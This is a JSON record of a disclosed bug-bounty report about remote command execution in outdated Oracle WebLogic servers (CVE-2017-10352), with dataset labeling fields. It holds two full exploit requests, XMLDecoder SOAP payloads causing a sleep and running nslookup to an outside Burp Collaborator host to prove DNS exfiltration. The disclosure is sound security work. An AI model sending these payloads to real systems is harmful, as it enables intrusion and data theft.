{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "sp1d3rs ",
  "title": "Remote OS command Execution in the 3 more Oracle Weblogic on the \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, \u2588\u2588\u2588\u2588, \u2588\u2588\u2588\u2588\u2588\u2588\u2588 [CVE-2017-10352]",
  "content": "\nDescription\nHello. I was able to identify 3 more RCE vulnerabilities due to the outdated Oracle Weblogic instance on the \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, \u2588\u2588\u2588, \u2588\u2588\u2588\u2588\u2588\nAfter my previous discoveries I decided to dig deeper into the \u2588\u2588\u2588.mil scope/IP space and found other instances of vulnerable Oracle WebLogic. I decided to fill all this additional findings in the single report\nPOC\nThis request to the https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/wls-wsat/CoordinatorPortType will trigger sleep for 10 seconds (same applies for \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, \u2588\u2588\u2588\u2588\u2588\u2588\u2588):\nCode 569 Bytes\n1POST /wls-wsat/CoordinatorPortType HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Content-Length: 423\n4content-type: text/xml\n5Accept-Encoding: gzip, deflate, compress\n6Accept: */*\n7\n8<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n9  <soapenv:Header>\n10    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n11    <java class=\"java.beans.XMLDecoder\">\n12        <object class=\"java.lang.Thread\" method=\"sleep\">\n13          <long>10000</long>\n14        </object>\n15      </java>  \n16    </work:WorkContext>\n17  </soapenv:Header>\n18  <soapenv:Body/>\n19</soapenv:Envelope>\nThe next request will resolve custom Burp Collaborator hostname via nslookup OS command to prove that it's possible to exfiltrate data via DNS:\nCode 853 Bytes\n1POST /wls-wsat/CoordinatorPortType HTTP/1.1\n2Host: \u2588\u2588\u2588\n3Content-Length: 724\n4content-type: text/xml\n5Accept-Encoding: gzip, deflate, compress\n6Accept: */*\n7\n8<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n9\t<soapenv:Header>\n10\t\t<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n11\t\t\t<java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \n12\t\t\t<void class=\"java.lang.ProcessBuilder\"> \n13\t\t\t\t<array class=\"java.lang.String\" length=\"3\">\n14\t\t\t\t<void index = \"0\">\n15\t\t\t\t\t<string>cmd</string>\n16\t\t\t\t</void>\n17\t\t\t\t<void index = \"1\"> \n18\t\t\t\t\t<string>/c</string> \n19\t\t\t\t</void>\n20\t\t\t\t<void index = \"2\">\n21\t\t\t\t\t<string>nslookup j3nxpi8ecz9uznkpu32mb7pj9af13q.burpcollaborator.net</string>\n22\t\t\t\t</void>\n23\t\t\t</array>\n24\t\t\t<void method=\"start\"/>\n25\t\t\t</void>\n26\t\t\t</java>\n27\t\t\t</work:WorkContext> \n28\t</soapenv:Header> \n29<soapenv:Body/>\n30</soapenv:Envelope>\nNote: to reproduce the second case with nslookup, j3nxpi8ecz9uznkpu32mb7pj9af13q.burpcollaborator.net host should be replaced by your own Burp Collaborator instance to catch the DNS request\nSuggested fix\nPatching WebLogic to the resent version will fix the issue.\nImpact\nRemote OS command execution.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1570574280,
  "report_url": "https://hackerone.com/reports/634630",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a POST request to the vulnerable WebLogic endpoint '/wls-wsat/CoordinatorPortType' with a crafted SOAP envelope containing a sleep command in the WorkContext header."
    ],
    [
      2,
      "Send another POST request to the same endpoint with a different crafted SOAP envelope containing an OS command (e.g., nslookup to a Burp Collaborator domain) in the WorkContext header to demonstrate command execution."
    ]
  ],
  "vuln_description": "The vulnerability is a Remote OS Command Execution (RCE) in outdated Oracle WebLogic instances due to improper handling of XML data in SOAP requests. Attackers can exploit this by sending crafted SOAP requests that trigger command execution on the server.",
  "reason": "The attack involves crafting specific SOAP requests to exploit a known vulnerability (CVE-2017-10352) in WebLogic. The steps are straightforward and do not require complex interactions or state manipulation. The vulnerability is well-documented and the exploit pattern is common for this type of issue.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves remote OS command execution in Oracle WebLogic due to outdated instances, which is not related to authentication or authorization bypass within the same application context. The described methodology focuses on AuthN/AuthZ and IDOR vulnerabilities within a single application by swapping user sessions and resource IDs, not on RCE vulnerabilities in middleware components.",
    "is_detectable": false
  }
}